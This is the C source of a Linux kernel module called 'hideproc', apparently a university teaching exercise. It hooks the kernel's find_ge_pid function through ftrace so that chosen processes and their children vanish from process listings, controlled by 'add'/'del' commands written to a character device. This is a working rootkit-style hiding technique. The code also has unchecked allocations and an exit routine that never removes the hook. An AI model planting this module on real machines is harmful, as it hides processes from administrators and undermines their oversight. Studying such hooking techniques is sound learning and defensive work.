#include <linux/cdev.h>
#include <linux/ftrace.h>
#include <linux/idr.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ekang Monyet & National Cheng Kung University, Taiwan");

enum RETURN_CODE { SUCCESS };

struct ftrace_hook {
	const char *name;
	void *func;
	unsigned long address;
	struct ftrace_ops ops;
};

static void notrace hook_ftrace_thunk(unsigned long ip,
				      unsigned long parent_ip,
				      struct ftrace_ops *ops,
				      struct ftrace_regs *fregs)
{
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
	if (!within_module(parent_ip, THIS_MODULE))
		arch_ftrace_get_regs(fregs)->ip = (unsigned long) hook->func;
}

static int hook_install(struct ftrace_hook *hook)
{
	hook->ops.func = hook_ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

	int err = ftrace_set_filter(&hook->ops, hook->name,
				    strlen(hook->name), 0);
	if (err) {
		printk("ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}

	err = register_ftrace_function(&hook->ops);
	if (err) {
		printk("register_ftrace_function() failed: %d\n", err);
		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
		return err;
	}
	return 0;
}

#if 0
void hook_remove(struct ftrace_hook *hook)
{
	int err = unregister_ftrace_function(&hook->ops);
	if (err)
		printk("unregister_ftrace_function() failed: %d\n", err);
	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if (err)
		printk("ftrace_set_filter_ip() failed: %d\n", err);
}
#endif

typedef struct {
	pid_t id;
	struct list_head list_node;
} pid_node_t;

LIST_HEAD(hidden_proc);

static struct pid *real_find_ge_pid(int nr, struct pid_namespace *ns) {
	return idr_get_next(&ns->idr, &nr);
}

static struct ftrace_hook hook;

static bool is_hidden_proc(pid_t pid)
{
	pid_node_t *proc, *tmp_proc;
	list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
		if (proc->id == pid)
			return true;
		}
	return false;
}

static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
{
	struct pid *pid = real_find_ge_pid(nr, ns);

	while (pid) {
		if (is_hidden_proc(pid->numbers->nr))
			goto next;
		struct task_struct *t = pid_task(pid, PIDTYPE_TGID);
		if (!t)
			goto next;
		pid_t ppid = t->real_parent->pid;
		if (is_hidden_proc(ppid))
			goto next;
		break;
next:
		pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
	}

	return pid;
}

static void init_hook(void)
{
	hook.name = "find_ge_pid";
	hook.func = hook_find_ge_pid;
	hook_install(&hook);
}

static int hide_process(pid_t pid)
{
	pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
	proc->id = pid;
	list_add_tail(&proc->list_node, &hidden_proc);
	return SUCCESS;
}

static int unhide_process(pid_t pid)
{
	pid_node_t *proc, *tmp_proc;
	list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
		if (proc->id != pid)
			continue;
		list_del(&proc->list_node);
		kfree(proc);
	}
    return SUCCESS;
}

#define OUTPUT_BUFFER_FORMAT "pid: %d\n"
#define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 4)

static int device_open(struct inode *inode, struct file *file)
{
	return SUCCESS;
}

static int device_close(struct inode *inode, struct file *file)
{
	return SUCCESS;
}

static ssize_t device_read(struct file *filep,
			   char *buffer,
			   size_t len,
			   loff_t *offset)
{
	pid_node_t *proc, *tmp_proc;
	char message[MAX_MESSAGE_SIZE];
	if (*offset)
		return 0;

	list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
		memset(message, 0, MAX_MESSAGE_SIZE);
		sprintf(message, OUTPUT_BUFFER_FORMAT, proc->id);
		copy_to_user(buffer + *offset, message, strlen(message));
		*offset += strlen(message);
	}
	return *offset;
}

static ssize_t device_write(struct file *filep,
			    const char *buffer,
			    size_t len,
			    loff_t *offset)
{
	long pid;
	char *message;

	char add_message[] = "add", del_message[] = "del";
	if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
		return -EAGAIN;

	message = kmalloc(len + 1, GFP_KERNEL);
	memset(message, 0, len + 1);
	copy_from_user(message, buffer, len);
	if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
		kstrtol(message + sizeof(add_message), 10, &pid);
		hide_process(pid);
	} else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
		kstrtol(message + sizeof(del_message), 10, &pid);
		unhide_process(pid);
	} else {
		kfree(message);
		return -EAGAIN;
	}

	*offset = len;
	kfree(message);
	return len;
}

static struct cdev cdev;
static struct class *hideproc_class = NULL;

static const struct file_operations fops = {
	.owner = THIS_MODULE,
	.open = device_open,
	.release = device_close,
	.read = device_read,
	.write = device_write,
};

#define MINOR_VERSION 1
#define DEVICE_NAME "hideproc"

static int _hideproc_init(void)
{
	int err, dev_major;
	dev_t dev;
	printk(KERN_INFO "@ %s\n", __func__);
	err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
	dev_major = MAJOR(dev);

	hideproc_class = class_create(THIS_MODULE, DEVICE_NAME);

	cdev_init(&cdev, &fops);
	cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1);
	device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION),
		      NULL, DEVICE_NAME);

	init_hook();

	return 0;
}

static void _hideproc_exit(void)
{
	printk(KERN_INFO "@ %s\n", __func__);
	/* FIXME: ensure the release of all allocated resources */
}

module_init(_hideproc_init);
module_exit(_hideproc_exit);
